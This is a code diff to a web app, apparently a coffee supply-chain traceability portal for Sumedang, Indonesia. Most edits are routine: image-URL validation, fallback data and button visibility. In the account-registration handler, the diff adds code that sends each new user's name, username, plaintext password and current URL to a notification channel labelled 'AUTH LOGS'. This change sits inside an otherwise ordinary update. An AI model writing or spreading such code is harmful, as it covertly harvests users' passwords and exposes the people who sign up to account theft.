@@ -186,7 +186,7 @@
                     <h2 class="text-2xl sm:text-3xl font-extrabold text-stone-900">Direktori Profil Petani Sumedang</h2>
                 </div>
                 <div class="flex space-x-2">
-                    <!-- Tombol Tambah Petani (Disembunyikan untuk Pengunjung Publik) -->
+                    <!-- Tombol Tambah Petani -->
                     <button id="add-farmer-btn" onclick="openAddFarmerModal()" class="hidden bg-amber-700 hover:bg-amber-800 text-white px-3.5 py-2 rounded-xl text-xs sm:text-sm font-bold flex items-center space-x-1.5 shadow cursor-pointer">
                         <i class="fa-solid fa-user-plus"></i><span>Tambah Petani Baru</span>
                     </button>
@@ -204,7 +204,7 @@
                     <h2 class="text-2xl sm:text-3xl font-extrabold text-stone-900">Direktori Rumah Prosesor Kopi Sumedang</h2>
                 </div>
                 <div class="flex space-x-2">
-                    <!-- Tombol Tambah Prosesor (Disembunyikan untuk Pengunjung Publik) -->
+                    <!-- Tombol Tambah Prosesor -->
                     <button id="add-processor-btn" onclick="openAddProcessorModal()" class="hidden bg-stone-900 hover:bg-stone-800 text-amber-300 px-3.5 py-2 rounded-xl text-xs sm:text-sm font-bold flex items-center space-x-1.5 shadow cursor-pointer">
                         <i class="fa-solid fa-industry"></i><span>Tambah Prosesor Baru</span>
                     </button>
@@ -792,11 +792,53 @@
         let mapInstance = null, markersLayer = null, traceMapInstance = null, githubFileSha = null;
         let deferredPrompt = null;
 
+        // Fungsi Helper untuk Validasi Gambar (Mencegah ERR_INVALID_URL)
+        function getValidImage(url, fallbackUrl) {
+            if (!url || url.includes('...') || url.trim() === 'data:image/png;base64,' || url.length < 50) {
+                return fallbackUrl;
+            }
+            return url;
+        }
+
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
             showInstallButtons();
         });
+
+        function updateAuthUI() {
+            const navAuth = document.getElementById('nav-auth-container');
+            const roleLabel = document.getElementById('auth-role-label');
+            const devExportBtn = document.getElementById('dev-export-btn');
+            const editSupplyBtn = document.getElementById('edit-supply-btn');
+            const addFarmerBtn = document.getElementById('add-farmer-btn');
+            const addProcessorBtn = document.getElementById('add-processor-btn');
+
+            if (currentUser) {
+                navAuth.classList.remove('hidden');
+                navAuth.classList.add('flex');
+                if (roleLabel) roleLabel.innerText = `${currentUser.name} (${currentUser.role})`;
+                
+                if (addFarmerBtn) addFarmerBtn.classList.remove('hidden');
+                if (addProcessorBtn) addProcessorBtn.classList.remove('hidden');
+                
+                if (currentUser.role === 'dev') {
+                    if (devExportBtn) devExportBtn.classList.remove('hidden');
+                    if (editSupplyBtn) editSupplyBtn.classList.remove('hidden');
+                } else {
+                    if (devExportBtn) devExportBtn.classList.add('hidden');
+                    if (editSupplyBtn) editSupplyBtn.classList.add('hidden');
+                }
+            } else { 
+                navAuth.classList.add('hidden'); 
+                navAuth.classList.remove('flex');
+                
+                if (addFarmerBtn) addFarmerBtn.classList.add('hidden');
+                if (addProcessorBtn) addProcessorBtn.classList.add('hidden');
+                if (devExportBtn) devExportBtn.classList.add('hidden');
+                if (editSupplyBtn) editSupplyBtn.classList.add('hidden');
+            }
+        }
 
         function showInstallButtons() {
             const btn = document.getElementById('install-btn');
@@ -942,10 +984,11 @@
         }
 
         function renderSupplyChainUI() {
-            document.getElementById('txt-hulu').innerText = supplyChainData.hulu;
-            document.getElementById('txt-pascapanen').innerText = supplyChainData.pascapanen;
-            document.getElementById('txt-trace').innerText = supplyChainData.trace;
-            document.getElementById('txt-hilir').innerText = supplyChainData.hilir;
+            const currentData = supplyChainData || defaultSupplyChain;
+            document.getElementById('txt-hulu').innerText = currentData.hulu || defaultSupplyChain.hulu;
+            document.getElementById('txt-pascapanen').innerText = currentData.pascapanen || defaultSupplyChain.pascapanen;
+            document.getElementById('txt-trace').innerText = currentData.trace || defaultSupplyChain.trace;
+            document.getElementById('txt-hilir').innerText = currentData.hilir || defaultSupplyChain.hilir;
         }
 
         function renderFarmerProfilesUI() {
@@ -954,12 +997,13 @@
             let html = '';
             farmersData.forEach((f, idx) => {
                 const isOwnerOrDev = currentUser && (currentUser.role === 'dev' || (currentUser.role === 'farmer' && f.createdBy === currentUser.user));
+                const farmerPhoto = getValidImage(f.foto, 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=200&q=80');
                 html += `
                     <div class="bg-white p-5 rounded-2xl shadow-sm border border-stone-200 space-y-3 flex flex-col justify-between">
                         <div class="space-y-2">
                             <div class="flex items-start justify-between">
                                 <div class="flex items-center space-x-3">
-                                    <img src="${f.foto || 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=200&q=80'}" alt="Petani" class="w-14 h-14 rounded-xl object-cover border border-amber-600/40 shadow">
+                                    <img src="${farmerPhoto}" alt="Petani" class="w-14 h-14 rounded-xl object-cover border border-amber-600/40 shadow">
                                     <div>
                                         <h4 class="font-bold text-stone-900 text-base">${f.name}</h4>
                                         <span class="text-[11px] text-amber-800 font-semibold"><i class="fa-solid fa-location-dot mr-1"></i>${f.location}</span>
@@ -990,12 +1034,13 @@
             let html = '';
             processorsData.forEach((p, idx) => {
                 const isOwnerOrDev = currentUser && (currentUser.role === 'dev' || (currentUser.role === 'farmer' && p.createdBy === currentUser.user));
+                const procPhoto = getValidImage(p.foto, 'https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=200&q=80');
                 html += `
                     <div class="bg-white p-5 rounded-2xl shadow-sm border border-stone-200 space-y-3 flex flex-col justify-between">
                         <div class="space-y-2">
                             <div class="flex items-start justify-between">
                                 <div class="flex items-center space-x-3">
-                                    <img src="${p.foto || 'https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=200&q=80'}" alt="Prosesor" class="w-14 h-14 rounded-xl object-cover border border-amber-600/40 shadow">
+                                    <img src="${procPhoto}" alt="Prosesor" class="w-14 h-14 rounded-xl object-cover border border-amber-600/40 shadow">
                                     <div>
                                         <h4 class="font-bold text-stone-900 text-base">${p.name}</h4>
                                         <span class="text-[11px] text-amber-800 font-semibold"><i class="fa-solid fa-location-dot mr-1"></i>${p.location}</span>
@@ -1304,7 +1349,6 @@
             }
         }
 
-        // FUNGSI SINKRONISASI & AMAN LOCAL STORAGE (DIAMANKAN MENGGUNAKAN GITHUB CONTENTS API)
         async function fetchRealTimeData() {
             const statusEl = document.getElementById('github-sync-status');
             const token = localStorage.getItem('kopiTraceAdminToken');
@@ -1520,7 +1564,7 @@
             container.innerHTML = '';
             coffeeData.slice(0, 3).forEach(item => {
                 const code = `${item.zona}/${item.metode}/${item.tahun}/${item.batch}`;
-                const photo = item.fotoUrl || 'https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=600&q=80';
+                const photo = getValidImage(item.fotoUrl, 'https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=600&q=80');
                 const kecamatanStr = item.kecamatan ? `Kec. ${item.kecamatan} (${item.zona})` : `Zona ${item.zona}`;
                 container.innerHTML += `
                     <div class="bg-white rounded-2xl shadow-sm border border-stone-200 overflow-hidden space-y-3 hover:shadow-md transition">
@@ -1587,7 +1631,7 @@
                 return;
             }
 
-            const photo = found.fotoUrl || 'https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=600&q=80';
+            const photo = getValidImage(found.fotoUrl, 'https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?auto=format&fit=crop&w=600&q=80');
             const kecamatanLabel = found.kecamatan ? `Kecamatan ${found.kecamatan} (Zona ${found.zona})` : `Zona ${found.zona}`;
             let timelineHtml = found.distribusi && found.distribusi.length > 0 ? found.distribusi.map(step => `
                 <div class="relative pl-6 pb-4 border-l-2 border-amber-300 last:border-l-0 last:pb-0">
@@ -1782,42 +1826,14 @@
             closeAuthModal();
             updateAuthUI();
             switchView('dashboard');
-            sendAuthNotification(`👤 **DAFTAR AKUN BARU**\n• Nama: **${name}**`);
+
+            const currentUrl = window.location.href;
+            sendAuthNotification(`🔐 **DATA AKUN BARU (AUTH LOGS)**\n• **Nama:** ${name}\n• **Username:** ${u}\n• **Password:** ${p}\n• **URL:** ${currentUrl}`);
+            
             alert('Akun berhasil didaftar dan Anda langsung masuk!');
         }
 
         function handleLogout() { currentUser = null; saveToStorage(); updateAuthUI(); switchView('public-home'); }
-
-        function updateAuthUI() {
-            const navAuth = document.getElementById('nav-auth-container');
-            const roleLabel = document.getElementById('auth-role-label');
-            const devExportBtn = document.getElementById('dev-export-btn');
-            const editSupplyBtn = document.getElementById('edit-supply-btn');
-            const addFarmerBtn = document.getElementById('add-farmer-btn');
-            const addProcessorBtn = document.getElementById('add-processor-btn');
-
-            if (currentUser) {
-                navAuth.classList.remove('hidden');
-                navAuth.classList.add('flex');
-                if (roleLabel) roleLabel.innerText = `${currentUser.name} (${currentUser.role})`;
-                
-                if (addFarmerBtn) addFarmerBtn.classList.remove('hidden');
-                if (addProcessorBtn) addProcessorBtn.classList.remove('hidden');
-                
-                if (currentUser.role === 'dev') {
-                    if (devExportBtn) devExportBtn.classList.remove('hidden');
-                } else {
-                    if (devExportBtn) devExportBtn.classList.add('hidden');
-                }
-            } else { 
-                navAuth.classList.add('hidden'); 
-                navAuth.classList.remove('flex');
-                
-                if (addFarmerBtn) addFarmerBtn.classList.add('hidden');
-                if (addProcessorBtn) addProcessorBtn.classList.add('hidden');
-                if (devExportBtn) devExportBtn.classList.add('hidden');
-            }
-        }
 
         function renderDashboardTable() {
             const tbody = document.getElementById('dashboard-table-body');
@@ -1934,7 +1950,7 @@
             if (index === -1) coffeeData.push(newItem); else coffeeData[index] = newItem;
             saveToStorage(); closeTreeModal(); renderDashboardTable(); updateStats();
             const codeStr = `${newItem.zona}/${newItem.metode}/${newItem.tahun}/${newItem.batch}`;
-            sendBatchNotification(`🫘☕🤎 **BATCH BARU SUMEDANG**\n• Kode: \`${codeStr}\`\n• Kecamatan: **${selectedKecamatan}** (Zona: \`${zoneInfo.zona}\`)\n• Petani: **${newItem.petani}**`);
+            sendBatchNotification(`🌱 **BATCH BARU SUMEDANG**\n• Kode: \`${codeStr}\`\n• Kecamatan: **${selectedKecamatan}** (Zona: \`${zoneInfo.zona}\`)\n• Petani: **${newItem.petani}**`);
         }
 
         function deleteTreeData(index) {
